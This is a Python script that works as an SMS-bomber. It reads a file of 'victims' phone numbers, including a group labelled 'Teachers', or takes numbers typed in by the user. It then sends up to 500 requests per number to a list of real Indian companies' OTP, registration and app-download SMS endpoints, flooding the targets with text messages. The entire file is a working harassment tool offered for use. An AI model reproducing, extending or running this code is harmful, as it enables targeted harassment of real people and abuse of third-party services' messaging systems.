#----------------------- Importing all stufs
from time import time, sleep
#from datetime import datetime as dt
#from urllib.request import urlopen, quote, unquote
from requests import post
import os
from random import choice

#------------------------ Variables to store data
start = time()
#now = dt.now()
file = 'victims_numbers.txt'
numbers = {}
test = []
linksFor91 = [
    'http://m.naaptol.com/faes/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=target',
    'https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=target',
    'https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=target',
    'https://www.frotels.com/appsendsms.php?mobno=target',
    'https://www.gapoon.com/userSignup?mobile=target&email=smsbomber@gmail.com&name=smsbomber',
    'https://login.housing.com/api/v2/send-otp?phone=target',
    'https://porter.in/restservice/send_app_link_sms?brand=porter&referrer_string=&phone=target',
    'https://cityflo.com/website-app-download-link-sms/?mobile_number=target',
    'https://api.nnnow.com/d/api/appDownloadLink?mobileNumber=target',
    'https://login.web.ajio.com/api/auth/signupSendOTP?firstName=xxps&login=wiqpd1223@wqew.com&password=QaSpw@1s&requestType=SENDOTP&mobileNumber=target',
    'https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20target',
    'https://unacademy.com/api/v1/user/get_app_link/?phone=target',
    'https://www.treebo.com/api/v2/auth/login/otp/?phone_number=target'
            ]

multiLinks = []
def connected(host='https://www.google.co.in'): #Checking network connection.
    try:
        post(host,timeout=50)
        return True
    except:
        return False
def defualtNum():
    list1 = []
    with open(file,'rt') as victims_lis:

        victim_num_lis = victims_lis.read()

        vic_lis = victim_num_lis.split('/')

        for vic_and_num in vic_lis:

            vic_and_num_lis = vic_and_num.split('\n')

            for name in vic_and_num_lis:

                if (name == 'Teachers') or (name == ''):
                    pass
                else:
                    name = name.replace(' ', '')
                    numbers[name.split(':')[0]] = name.split(':')[1]
                    list1.append(name.split(':')[1])
    return list1

if connected():
    print('[*]Connected to internet !')
else:
    print('[*]No internet !')
    exit()
while True:
    os.system('cls')
    cc = input('Enter country code without +: ')
    cc = cc.replace(' ','')
    if cc == '' or len(cc) not in range(2,4):
        print('[*]Invalid Country Code !')
        sleep(1)
    elif cc.isnumeric() and len(cc) in range(2,4):
        if cc == '91':
            linked = linksFor91 + multiLinks
#            print(linked)
#            sleep(2)
        else:
            linked = multiLinks
#            print(linked)
#            sleep(2)
        break
    else:
        print('[*]Invalid Country Code !')
        sleep(1)

while True:
    os.system('cls')
    confirm = input('Use Default (d) or a new number (n): ')
    confirm = confirm.lower()

    if confirm == 'd':
        victimNumber = defualtNum()
#        print(victimNumber)
        break
#        exit()

    elif confirm == 'n':
        
        while True:
            os.system('cls')
            victimNumber = input("Enter victim's Number, you can type more than one number seperated by comma(,): ")
            victimNumber = victimNumber.replace(' ','')
            
            if victimNumber == '' or len(victimNumber) < 10:
                print('[*]Invalid number !')
                sleep(1)
                
            elif ',' in victimNumber and (len(victimNumber) == 10):
                print('[*]Invalid number there a comma removing it !')
                victimNumber.replace(',','')
                sleep(1)
                
            elif ',' not in victimNumber and (len(victimNumber) > 10):
                print('[*]Invalid number !')
                sleep(1)
                
                
            else:
                break
        break

    else:
        print('[*] Invalid option !')
        sleep(1)

if victimNumber == defualtNum():
    pass
elif len(victimNumber) == 10 and victimNumber.isnumeric():
#    print('[*]Single Number !')
    test.append(victimNumber)
    victimNumber = test
#    test.clear()
#    print(victimNumber)
#    sleep(5)
else:
    victimsLis = victimNumber.split(',')
#    print(victimsLis)
    testLis1 = []
    testLis2 = victimsLis.copy()
    
    for num in victimsLis:
        
#        print(testLis2)
        if len(num) == 10 and num.isnumeric():
#            testLis1.append(num)
            pass
        
        elif (len(num) < 10 or len(num) > 10):
            print(f'[*]Invalid number is present at index {victimsLis.index(num) + 1}')
            victimsLis.remove(num)
            print('[*]Number removed !\n')
            
#        elif num in testLis2:
#            print(f'[*]Duplicate number is present at index {victimsLis.index(num) + 1}')
#            victimsLis.remove(num)
#            print('[*]Number removed !\n')
            
#        testLis2.remove(num)
        
#    print(victimsLis)
    victimNumber = victimsLis
#    print(testLis1)

#    print('[*]Multiple numbers !')
while True:
    os.system('cls')
    msgCount = input('How many msg do you want to send to the victim max(500): ')
    if msgCount.isnumeric():
        msgCount = int(msgCount)
        if msgCount < 1:
            print('[*]Invalid value must be atleast 1')
            print('[*]Automatically setting msg count to min value (1)')
            msgCount = 1
            
        elif msgCount > 500:
            print('[*]Invalid value max 500')
            print('[*]Automatically setting msg count to max value (500)')
            msgCount = 500
            
        break
        
    else:
        print('[*]Invalid value !')
        sleep(1)
        
for mobile in victimNumber:
    for i in range(1,msgCount+1):
        
        lin = choice(linked)
        if lin == '':
            pass
        else:
            link = lin.replace('target',mobile)
            post(link)
        print("hai")
        print(i)
    print('hai2')
    
#print(get('https://www.google.co.in').content)
print(f'\n{time()-start}')
#input('')